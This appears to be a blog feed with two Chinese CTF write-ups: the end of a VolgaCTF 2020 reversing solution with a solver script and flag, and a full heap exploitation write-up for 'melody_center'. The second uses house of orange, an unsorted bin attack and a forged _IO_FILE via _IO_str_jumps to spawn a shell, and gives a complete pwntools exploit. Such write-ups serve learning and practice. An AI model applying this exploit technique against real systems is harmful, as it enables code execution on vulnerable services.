class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000BF</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000C9</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000D3</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000DD</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000E7</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000F1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000FB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000FB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000FB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000FB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000FB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000FB</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(low_bytes, high_bytes)</span>:</span></span><br><span class="line">    a1 = low_bytes</span><br><span class="line">    a2 = high_bytes</span><br><span class="line">    v2 = (((((a2 &amp; <span class="number">0x5555555555555555</span>) + ((a2 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x5555555555555555</span>)) &amp; <span class="number">0x3333333333333333</span>) \</span><br><span class="line">         + ((((a2 &amp; <span class="number">0x5555555555555555</span>) + ((a2 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x5555555555555555</span>)) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3333333333333333</span>)) &amp; <span class="number">0xF0F0F0F0F0F0F0F</span>) \</span><br><span class="line">         + ((((((a2 &amp; <span class="number">0x5555555555555555</span>) + ((a2 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x5555555555555555</span>)) &amp; <span class="number">0x3333333333333333</span>) \</span><br><span class="line">         + ((((a2 &amp; <span class="number">0x5555555555555555</span>) + ((a2 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x5555555555555555</span>)) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3333333333333333</span>)) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF0F0F0F0F0F0F0F</span>)</span><br><span class="line">    v2 = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">    v3 = ((((v2 &amp; <span class="number">0xFF00FF00FF00FF</span>) + ((v2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00FF00FF00FF</span>)) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF0000FFFF</span>) \</span><br><span class="line">         + (((v2 &amp; <span class="number">0xFF00FF00FF00FF</span>) + ((v2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00FF00FF00FF</span>)) &amp; <span class="number">0xFFFF0000FFFF</span>)</span><br><span class="line">    v3 = v3 &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">    v4 = (((a1 &amp; <span class="number">0x5555555555555555</span>) + ((a1 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x5555555555555555</span>)) &amp; <span class="number">0x3333333333333333</span>) \</span><br><span class="line">         + ((((a1 &amp; <span class="number">0x5555555555555555</span>) + ((a1 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x5555555555555555</span>)) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3333333333333333</span>)</span><br><span class="line">    v4 = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">    v5 = (v4 &amp; <span class="number">0xF0F0F0F0F0F0F0F</span>) + ((v4 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF0F0F0F0F0F0F0F</span>)</span><br><span class="line">    v5 = v5 &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (v3 &amp; <span class="number">0xFFFFFFFF</span>) \</span><br><span class="line">           + (((v5 &amp; <span class="number">0xFF00FF</span>) + ((v5 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00FF</span>)) &amp; <span class="number">0xFFFF</span>) \</span><br><span class="line">           + (((v5 &amp; <span class="number">0xFF00FF</span>) + ((v5 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00FF</span>)) &gt;&gt; <span class="number">16</span>) \</span><br><span class="line">           + (((((v5 &amp; <span class="number">0xFF00FF00FF00FF</span>) + ((v5 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00FF00FF00FF</span>)) &amp; <span class="number">0xFFFF0000FFFF</span>) \</span><br><span class="line">           + ((((v5 &amp; <span class="number">0xFF00FF00FF00FF</span>) + ((v5 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00FF00FF00FF</span>)) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF0000FFFF</span>)) &gt;&gt; <span class="number">32</span>) \</span><br><span class="line">           + (v3 &gt;&gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(depth, high_bytes, low_bytes)</span>:</span></span><br><span class="line">    res = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(depth + <span class="number">1</span>)]</span><br><span class="line">    count = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(depth + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, depth + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            res[i] = calc(high_bytes, low_bytes)</span><br><span class="line">            count[i] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">2</span>:</span><br><span class="line">            res[i] = calc(high_bytes ^ <span class="number">1</span>, low_bytes)</span><br><span class="line">            count[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            val_1 = res[i - <span class="number">1</span>]</span><br><span class="line">            val_2 = res[i - <span class="number">2</span>]</span><br><span class="line">            count[i] = (count[i - <span class="number">1</span>] + count[i - <span class="number">2</span>]) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">            tmp = calc(high_bytes ^ (count[i]), low_bytes)</span><br><span class="line">            tmp += val_1 + val_2</span><br><span class="line">            tmp &amp;= <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span></span><br><span class="line">            <span class="keyword">while</span> tmp &gt; table[i]:</span><br><span class="line">                tmp = tmp - table[i]</span><br><span class="line">            res[i] = tmp</span><br><span class="line">    print(<span class="string">"set &#123;long long&#125;($rsp + 0xb0)= "</span> + hex(count[depth]))</span><br><span class="line">    <span class="comment"># for item in res:</span></span><br><span class="line">    <span class="comment">#     print(hex(item))</span></span><br><span class="line">    <span class="keyword">return</span> res[depth]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v27 = <span class="number">0x9C8A210019B32312</span></span><br><span class="line">v28 = <span class="number">0x342D41A3B6410FF</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(strings), <span class="number">0x10</span>):</span><br><span class="line">    print(<span class="string">"loop "</span> + str(i // <span class="number">0x10</span> + <span class="number">1</span>) + <span class="string">":"</span>)</span><br><span class="line"></span><br><span class="line">    value = process(<span class="number">0x100</span>, u64(strings[i:i+<span class="number">8</span>]), u64(strings[i+<span class="number">8</span>:i+<span class="number">0x10</span>]))</span><br><span class="line">    high = value &gt;&gt; <span class="number">64</span></span><br><span class="line">    low = value &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">    print(<span class="string">"set &#123;long long&#125;($rsp + 0xa0) = "</span> + hex(low))</span><br><span class="line">    print(<span class="string">"set &#123;long long&#125;($rsp + 0xa8) = "</span> + hex(high))</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(hex(u64(strings[i:i+8])), hex(u64(strings[i+8:i+0x10])))</span></span><br><span class="line"></span><br><span class="line">    v27 ^= low + u64(strings[i:i+<span class="number">8</span>])</span><br><span class="line">    v28 ^= high + u64(strings[i+<span class="number">8</span>:i+<span class="number">0x10</span>])</span><br><span class="line">    <span class="comment"># print(hex(v27), hex(v28))</span></span><br></pre></td></tr></table></figure>
<p>跑出来的结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loop 1:</span><br><span class="line">set &#123;long long&#125;($rsp + 0xb0)&#x3D; 0x1bed585606b77ee2</span><br><span class="line">set &#123;long long&#125;($rsp + 0xa0) &#x3D; 0x9f7063cbae808c39</span><br><span class="line">set &#123;long long&#125;($rsp + 0xa8) &#x3D; 0x31c27b4975c414f8</span><br><span class="line"></span><br><span class="line">loop 2:</span><br><span class="line">set &#123;long long&#125;($rsp + 0xb0)&#x3D; 0x1bed585606b77ee2</span><br><span class="line">set &#123;long long&#125;($rsp + 0xa0) &#x3D; 0xae737c67349d7930</span><br><span class="line">set &#123;long long&#125;($rsp + 0xa8) &#x3D; 0xa0c447a7cd22de</span><br><span class="line"></span><br><span class="line">loop 3:</span><br><span class="line">set &#123;long long&#125;($rsp + 0xb0)&#x3D; 0x1bed585606b77ee2</span><br><span class="line">set &#123;long long&#125;($rsp + 0xa0) &#x3D; 0xb4ab72b2a625573c</span><br><span class="line">set &#123;long long&#125;($rsp + 0xa8) &#x3D; 0xf1b74bd139691b09</span><br><span class="line"></span><br><span class="line">loop 4:</span><br><span class="line">set &#123;long long&#125;($rsp + 0xb0)&#x3D; 0x1bed585606b77ee2</span><br><span class="line">set &#123;long long&#125;($rsp + 0xa0) &#x3D; 0x9d78f243a21282bb</span><br><span class="line">set &#123;long long&#125;($rsp + 0xa8) &#x3D; 0x6db7dea733d71b4d</span><br></pre></td></tr></table></figure>
<p>当时我以为把这个<code>recursive_func</code>直接patch掉，然后算出原C里面的v27和v28两个值（这里没输出，注释掉了），在动态调试的时候直接set就可以出flag了，结果这样做没对，搞得我一直以为是脚本写错了，但是反复检查都没错，心累。<br><br>最后看着差了一个字母的flag，我开始断在<code>PIE+0x1781</code>的为值一步一步地手动set值，才得到正确的flag。</p>
<p><img src="/2020/03/31/VolgaCTF-2020/gdb.png" alt="gdb"></p>
<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><p><code>VolgaCTF{16011432ba16efc8dcf779477985b3b9}</code></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn heap: melody_center</title>
    <url>/2020/02/07/pwn-heap-melody-center/</url>
    <content><![CDATA[<p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p>
<a id="more"></a>

<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>保护全开，题目给了四个功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Create                      </span><br><span class="line">2. Edit                        </span><br><span class="line">3. Show                        </span><br><span class="line">4. Exit</span><br></pre></td></tr></table></figure>
<p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(chunk_1)+----+----+</span><br><span class="line">         |    |0x31|          +----+----+(chunk_2)</span><br><span class="line">         +----+----+          |    |size|</span><br><span class="line">   +-----|    |    |--------&gt; +----+----+</span><br><span class="line">   |     +----+----+          |    |    |</span><br><span class="line">   |     |    |    |          +----+----+</span><br><span class="line">   |     +----+----+          |    |    |</span><br><span class="line">   |                          +----+----+</span><br><span class="line">   |                          ...........</span><br><span class="line">   |                          +----+----+(chunk_3)</span><br><span class="line">   |                          |    |0x21|</span><br><span class="line">   |                          +----+----+</span><br><span class="line">   +------------------------&gt; |    |    |</span><br><span class="line">                              +----+----+</span><br></pre></td></tr></table></figure>
<p><br>Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br>Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br>Exit就是调用exit(0)（用不上）</p>
<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
<li>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</li>
<li>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</li>
<li>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</span><br></pre></td></tr></table></figure>
但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</li>
<li>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：<ol>
<li><code>fp-&gt;_mode</code> = 0</li>
<li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li>
<li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li>
<li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li>
<li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li>
<li><code>fp-&gt;_flags</code>= 0</li>
<li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li>
<li><code>fp+0xe8</code> = system_addr</li>
</ol>
</li>
</ul>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content, _217, _108)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size of Heap: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, content)</span><br><span class="line">    p.sendlineafter(<span class="string">"217: "</span>, str(_217))</span><br><span class="line">    p.sendlineafter(<span class="string">"108: "</span>, str(_108))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(size, content, _217, _108)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size of Heap: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, content)</span><br><span class="line">    p.sendlineafter(<span class="string">"217: "</span>, str(_217))</span><br><span class="line">    p.sendlineafter(<span class="string">"108: "</span>, str(_108))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">"=========="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">                  p32(<span class="number">0</span>) + \</span><br><span class="line">                  p64(_IO_read_ptr) + \</span><br><span class="line">                  p64(_IO_read_end) + \</span><br><span class="line">                  p64(_IO_read_base) + \</span><br><span class="line">                  p64(_IO_write_base) + \</span><br><span class="line">                  p64(_IO_write_ptr) + \</span><br><span class="line">                  p64(_IO_write_end) + \</span><br><span class="line">                  p64(_IO_buf_base) + \</span><br><span class="line">                  p64(_IO_buf_end) + \</span><br><span class="line">                  p64(_IO_save_base) + \</span><br><span class="line">                  p64(_IO_backup_base) + \</span><br><span class="line">                  p64(_IO_save_end) + \</span><br><span class="line">                  p64(_IO_marker) + \</span><br><span class="line">                  p64(_IO_chain) + \</span><br><span class="line">                  p32(_fileno)</span><br><span class="line">      </span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_flush_str_jumps</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin5file_size</span></span><br><span class="line">                        _IO_read_end = main_arena_addr,</span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr - <span class="number">0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">    payload += p64(_IO_str_jumps_addr - <span class="number">8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c1b00</span></span><br><span class="line">_IO_list_all_offset = <span class="number">0x3c2500</span></span><br><span class="line">_IO_str_jumps_offset = <span class="number">0x3be4c0</span></span><br><span class="line">system_offset = <span class="number">0x456a0</span></span><br><span class="line">str_bin_sh_offset = <span class="number">0x18ac40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># old top chunk ==&gt; unsorted bin</span></span><br><span class="line">create(<span class="number">0x8d8</span>, <span class="string">"A"</span> * <span class="number">8</span> + <span class="string">"\n"</span>, <span class="number">217</span>, <span class="number">108</span>)</span><br><span class="line">edit(<span class="number">0x900</span>, <span class="string">"A"</span> * <span class="number">0x8d8</span> + p64(<span class="number">0x21</span>) + <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x6d1</span>), <span class="number">217</span>, <span class="number">108</span>)</span><br><span class="line">create(<span class="number">0x900</span>, <span class="string">"B"</span> * <span class="number">8</span> + <span class="string">"\n"</span>, <span class="number">217</span>, <span class="number">108</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak main_arena and then leak libc</span></span><br><span class="line">create(<span class="number">8</span>, <span class="string">"B"</span> * <span class="number">8</span>, <span class="number">217</span>, <span class="number">108</span>)</span><br><span class="line">res = show()</span><br><span class="line">main_arena = u64(res[<span class="number">0x18</span>:<span class="number">0x1e</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x58</span> - main_arena_offset</span><br><span class="line">_IO_list_all = libc_base + _IO_list_all_offset</span><br><span class="line">_IO_str_jumps = libc_base + _IO_str_jumps_offset</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># use unsorted bin attack to make _IO_list_all = main_arena + 0x58</span></span><br><span class="line"><span class="comment"># thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 ==&gt; small bin[5] (size = 0x60)</span></span><br><span class="line"><span class="comment"># fake a _IO_FILE struct in small bin[4] by writing the unsorted bin</span></span><br><span class="line"><span class="comment"># make use of _IO_str_jumps-&gt;_IO_str_finish</span></span><br><span class="line">payload = <span class="string">"E"</span> * <span class="number">0x30</span> </span><br><span class="line">payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)</span><br><span class="line">edit(<span class="number">0x300</span>, payload + <span class="string">"\n"</span> , <span class="number">217</span>, <span class="number">108</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger error</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"_IO_list_all: "</span> + hex(_IO_list_all))</span><br><span class="line">success(<span class="string">"_IO_str_jumps: "</span> + hex(_IO_str_jumps))</span><br><span class="line">success(<span class="string">"system: "</span> + hex(system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ol>
<li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li>
<li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li>
<li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li>
</ol>
